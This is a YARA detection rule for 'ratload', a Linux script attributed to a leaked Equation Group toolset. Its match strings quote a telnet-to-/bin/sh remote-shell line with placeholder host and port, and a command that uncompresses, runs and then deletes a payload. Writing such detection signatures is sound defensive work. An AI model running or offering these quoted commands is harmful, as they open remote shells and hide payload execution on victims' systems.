rule EquationGroup_ratload
{
	meta:
		description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
		author = "Florian Roth"
		reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
		date = "2017-04-08"
		hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
		os = "linux"
		filetype = "script"

	strings:
		$x1 = "/tmp/ratload.tmp.sh" fullword ascii
		$x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
		$s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii

	condition:
		filesize <250KB and 1 of them
}
